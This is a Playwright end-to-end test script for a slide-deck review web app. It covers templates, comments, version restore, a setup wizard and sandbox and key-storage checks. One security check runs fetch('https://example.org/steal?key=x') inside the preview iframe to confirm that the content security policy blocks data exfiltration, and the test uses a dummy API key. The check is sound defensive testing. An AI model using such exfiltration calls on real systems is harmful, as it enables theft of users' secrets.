/* End-to-end check of the review loop in a real browser (Chromium via Playwright).
   Run after `npm run build`:  node tests/e2e/run.mjs [path/to/extra-deck.zip]
   Fails (exit 1) when a step does not behave as expected. Screenshots land in tests/e2e/out. */
import { createRequire } from 'node:module';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import fs from 'node:fs';

const require = createRequire(import.meta.url);
/* Use the project's Playwright; fall back to a machine-wide install whose browser is already present. */
async function launch() {
  const candidates = [() => require('playwright'), () => createRequire('/opt/node-tools/')('playwright')];
  let last;
  for (const load of candidates) {
    try { return await load().chromium.launch(); } catch (e) { last = e; }
  }
  throw last;
}

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(here, '..', '..');
const out = path.join(here, 'out');
fs.mkdirSync(out, { recursive: true });
const extraDeck = process.argv[2];
const PORT = 4179;

const server = spawn('npx', ['vite', 'preview', '--port', String(PORT), '--strictPort'], { cwd: root, stdio: 'ignore' });
const stop = () => server.kill();
process.on('exit', stop);

const checks = [];
const check = (name, ok, detail = '') => {
  checks.push({ name, ok });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  (' + detail + ')' : ''}`);
};

async function waitForServer() {
  for (let i = 0; i < 60; i++) {
    try { if ((await fetch(`http://localhost:${PORT}/`)).ok) return; } catch { /* not up yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error('preview server did not start');
}

await waitForServer();
const browser = await launch();
const page = await browser.newPage({ viewport: { width: 1440, height: 900 }, deviceScaleFactor: 2 });
const pageErrors = [];
page.on('pageerror', (e) => pageErrors.push(e.message));
const shot = (name) => page.screenshot({ path: path.join(out, name) });

try {
  /* 1. Template -> editor */
  await page.goto(`http://localhost:${PORT}/`);
  await shot('01-start.png');
  await page.locator('.template', { hasText: 'Three-minute pitch' }).click();
  await page.getByRole('button', { name: /Skip the wizard/ }).click();
  await page.locator('.film').nth(6).waitFor({ timeout: 15000 });
  check('template opens with 7 detected slides', (await page.locator('.film').count()) === 7);
  await page.waitForFunction(() => document.querySelectorAll('.film-title')[1]?.textContent === 'Problem', null, { timeout: 15000 }).catch(() => {});
  check('slide titles are read from the deck', (await page.locator('.film-title').nth(1).textContent()) === 'Problem');

  /* 2. Navigate, comment, apply (demo provider: deterministic, no network) */
  await page.locator('.film').nth(2).click();
  await page.waitForFunction(() => document.querySelector('.position b')?.textContent === '3');
  check('clicking a slide moves the preview', true);
  await page.locator('.film').nth(0).click();
  await page.waitForFunction(() => document.querySelector('.position b')?.textContent === '1');
  await page.fill('#comment-text', 'replace "47 minutes" with "52 minutes"');
  await page.getByRole('button', { name: 'Add comment' }).click();
  await page.locator('.pin').first().waitFor();
  await shot('02-comment.png');
  await page.getByRole('button', { name: 'Apply round' }).click();
  await page.locator('.result').waitFor({ timeout: 30000 });
  const resultText = await page.locator('.result').innerText();
  check('a new version v2 is created', /v2 created/.test(resultText), resultText.split('\n')[0]);
  check('the check reports exactly slide 1 as changed', /Changed: slide 1\./.test(resultText) && /Every other slide is unchanged/.test(resultText));
  const frameText = await page.frameLocator('iframe[title="Deck preview"]').locator('h1').innerText();
  check('the preview shows the new text', frameText.includes('52 minutes'), frameText);
  await shot('03-applied.png');

  /* 3. Sandbox: deck code cannot reach the app */
  const isolated = await page.frameLocator('iframe[title="Deck preview"]').locator('body').evaluate(() => {
    try { void window.parent.document.body; return false; } catch { return true; }
  });
  check('deck code cannot read the app (opaque origin)', isolated);
  check('preview iframe is sandboxed to scripts only', (await page.locator('iframe[title="Deck preview"]').getAttribute('sandbox')) === 'allow-scripts');

  /* 3b. Keys: session only by default, and out of reach of deck code */
  await page.getByRole('button', { name: 'Settings' }).click();
  await page.fill('#set-key', 'sk-ant-e2e-secret');
  check('remember is off by default and warns when switched on', !(await page.locator('#set-remember').isChecked()) && (await page.locator('.notice.warn').count()) === 0);
  await page.locator('#set-remember').check();
  check('switching remember on shows the warning', await page.locator('.notice.warn').isVisible());
  await page.locator('#set-remember').uncheck();
  await page.getByRole('button', { name: 'Save settings' }).click();
  const stores = await page.evaluate(() => ({ local: localStorage.getItem('deckhack.settings') ?? '', session: sessionStorage.getItem('deckhack.settings') ?? '' }));
  check('the key is kept for the tab session only', stores.session.includes('sk-ant-e2e-secret') && !stores.local.includes('sk-ant-e2e-secret'));
  const frame = page.frameLocator('iframe[title="Deck preview"]').locator('body');
  const seen = await frame.evaluate(() => {
    const dump = (s) => { try { return JSON.stringify(Object.assign({}, s)); } catch { return ''; } };
    return dump(window.localStorage) + dump(window.sessionStorage) + document.cookie;
  }).catch(() => '');
  check('deck code sees no key in its own storage', !seen.includes('sk-ant'));
  const blocked = await frame.evaluate(() => new Promise((resolve) => {
    document.addEventListener('securitypolicyviolation', (e) => resolve(e.violatedDirective), { once: true });
    fetch('https://example.org/steal?key=x').catch(() => {});
    setTimeout(() => resolve('not blocked'), 3000);
  }));
  check('deck code cannot send data to other servers (CSP)', /connect-src/.test(blocked), blocked);
  await page.getByRole('button', { name: 'Settings' }).click();
  await page.getByRole('button', { name: 'Remove stored keys' }).click();
  const cleared = await page.evaluate(() => (localStorage.getItem('deckhack.settings') ?? '') + (sessionStorage.getItem('deckhack.settings') ?? ''));
  check('"Remove stored keys" clears the key', !cleared.includes('sk-ant'));
  await page.evaluate(() => { sessionStorage.clear(); localStorage.clear(); });

  /* 4. Versions: go back without losing history */
  await page.getByRole('tab', { name: /Versions/ }).click();
  check('two versions are listed', (await page.locator('.version').count()) === 2);
  await page.locator('.version').nth(1).getByRole('button', { name: 'Restore' }).click();
  await page.waitForFunction(() => document.querySelectorAll('.version').length === 3);
  const restored = await page.frameLocator('iframe[title="Deck preview"]').locator('h1').innerText();
  check('restoring v1 adds v3 and brings the old text back', restored.includes('47 minutes'), restored);
  await shot('04-versions.png');

  /* 5. Example deck: dummy data, a history and comments that demo mode can answer */
  await page.goto(`http://localhost:${PORT}/`);
  await page.getByRole('button', { name: 'Try the example deck' }).click();
  await page.locator('.film').nth(6).waitFor({ timeout: 20000 });
  check('example opens with 7 slides and 4 open comments', (await page.locator('.film').count()) === 7 && /Review \(4\)/.test(await page.getByRole('tab', { name: /Review/ }).innerText()));
  check('example starts at v2 with a version to go back to', /v2/.test(await page.locator('.version-chip').innerText()));
  await page.waitForTimeout(800);
  await shot('07-example.png');
  await page.getByRole('button', { name: 'Apply round' }).click();
  await page.locator('.result').waitFor({ timeout: 30000 });
  const exampleCheck = (await page.locator('.result-check').innerText()).trim();
  check('example round changes exactly the four commented slides', exampleCheck === 'Changed: slides 1, 3, 5, 7. Every other slide is unchanged.', exampleCheck);
  await page.locator('.film').nth(0).click();
  await page.waitForFunction(() => document.querySelector('.position b')?.textContent === '1');
  const exampleHook = await page.frameLocator('iframe[title="Deck preview"]').locator('h1').innerText();
  check('example: prepared answer is on the slide', exampleHook.includes('52 minutes'), exampleHook);
  await page.waitForTimeout(800);
  await shot('08-example-applied.png');

  /* 6. Start wizard: length, jury, storyline, content, AI */
  await page.goto(`http://localhost:${PORT}/`);
  await page.locator('.template', { hasText: 'Three-minute pitch' }).click();
  await page.getByText('5 minutes', { exact: true }).click();
  check('wizard: 5 minutes plans 9 slides', /^9 slides/.test((await page.locator('.wiz-plan-head').innerText()).trim()), await page.locator('.wiz-plan-head').innerText());
  await shot('09-wizard-length.png');
  await page.getByRole('button', { name: 'Next' }).click();
  await page.locator('#crit-business').check();
  check('wizard: ticking a criterion adds its slide to the plan', (await page.locator('.wiz-plan').innerText()).includes('Business'));
  await shot('10-wizard-jury.png');
  await page.getByRole('button', { name: 'Next' }).click();
  await page.getByText('Demo first', { exact: true }).click();
  const order = await page.locator('.wiz-plan li').allInnerTexts();
  check('wizard: storyline changes the order', /Demo/.test(order[1] ?? ''), order.join(' > ').replace(/\n/g, ' '));
  await shot('11-wizard-storyline.png');
  await page.getByRole('button', { name: 'Next' }).click();
  await page.fill('#wiz-project', 'WardRadar');
  await shot('12-wizard-content.png');
  await page.getByRole('button', { name: 'Next' }).click();
  await page.locator('#wiz-provider-claude').check();
  check('wizard: the API key is asked for where the provider is chosen', await page.locator('#wiz-key').isVisible());
  await shot('13-wizard-ai.png');
  await page.locator('#wiz-provider-demo').check();
  await page.getByRole('button', { name: 'Create deck', exact: true }).click();
  await page.locator('.film').nth(8).waitFor({ timeout: 20000 });
  check('wizard creates a 9-slide deck', (await page.locator('.film').count()) === 9);
  await page.waitForFunction(() => document.querySelectorAll('.film-title')[1]?.textContent === 'Demo', null, { timeout: 15000 }).catch(() => {});
  check('wizard deck follows the chosen storyline', (await page.locator('.film-title').nth(1).textContent()) === 'Demo');
  const wizardHook = await page.frameLocator('iframe[title="Deck preview"]').locator('h1').innerText();
  check('wizard deck carries the content that was typed', wizardHook.includes('WardRadar'), wizardHook);
  await page.waitForTimeout(800);
  await shot('14-wizard-deck.png');

  /* 6b. Point at an element, and links into the app */
  await page.locator('.film').nth(0).click();
  await page.waitForFunction(() => document.querySelector('.position b')?.textContent === '1');
  await page.getByRole('button', { name: 'Point at element' }).click();
  await page.frameLocator('iframe[title="Deck preview"]').locator('h1').click();
  await page.locator('.comment-target.chosen').waitFor({ timeout: 5000 });
  check('pointing at an element names it in the comment', /h1 “WardRadar/.test(await page.locator('.comment-target.chosen').innerText()), await page.locator('.comment-target.chosen').innerText());
  await page.fill('#comment-text', 'replace "WardRadar" with "WardRadar 2"');
  await page.getByRole('button', { name: 'Add comment' }).click();
  await page.locator('.comment').first().waitFor({ timeout: 5000 });
  check('the comment keeps its element', (await page.locator('.comment .comment-target').count()) === 1);
  await shot('15-point-at-element.png');
  await page.goto(`http://localhost:${PORT}/?example`);
  await page.locator('.film').nth(6).waitFor({ timeout: 20000 });
  check('?example opens the example deck directly', /PumpFinder/.test(await page.locator('.project').innerText()) && !page.url().includes('example'));
  await page.goto(`http://localhost:${PORT}/?template=plain-light`);
  check('?template= starts the wizard for that template', await page.getByText('New deck from “Plain light”').isVisible());

  /* 7. Optional: a real scripted deck (slides built in JavaScript) */
  if (extraDeck) {
    await page.goto(`http://localhost:${PORT}/`);
    await page.setInputFiles('#upload-files', extraDeck);
    await page.locator('.film').nth(5).waitFor({ timeout: 60000 });
    const n = await page.locator('.film').count();
    check('scripted deck: slides detected through its counter', n >= 10, `${n} slides`);
    await page.locator('.film').nth(7).click();
    await page.waitForFunction(() => document.querySelector('.position b')?.textContent === '8', null, { timeout: 15000 });
    check('scripted deck: jump to slide 8 works', true);
    await page.waitForTimeout(1500);
    await shot('05-scripted-deck.png');
    const errors = await page.locator('.errors').count() ? await page.locator('.errors').getAttribute('title') : '';
    check('scripted deck: loads without errors', !errors, errors ?? '');
    const phrase = process.argv[3];
    if (phrase) {
      await page.fill('#comment-text', `replace "${phrase}" with "${phrase} now"`);
      await page.getByRole('button', { name: 'Add comment' }).click();
      await page.getByRole('button', { name: 'Apply round' }).click();
      await page.locator('.result').waitFor({ timeout: 60000 });
      const text = (await page.locator('.result-check').innerText()).trim();
      check('scripted deck: an edit to slide 8 is reported as slide 8 only', /^Changed: slide 8\. Every other slide is unchanged\.$/.test(text), text);
      await page.waitForTimeout(1200);
      await shot('06-scripted-deck-applied.png');
    }
  }

  check('no errors in the app itself', pageErrors.length === 0, pageErrors.join(' | '));
} catch (e) {
  check('run completed', false, e.message.split('\n')[0]);
  await shot('99-failure.png').catch(() => {});
} finally {
  await browser.close();
  stop();
}

const failed = checks.filter((c) => !c.ok).length;
console.log(`\n${checks.length - failed}/${checks.length} checks passed. Screenshots: ${out}`);
process.exit(failed ? 1 : 0);
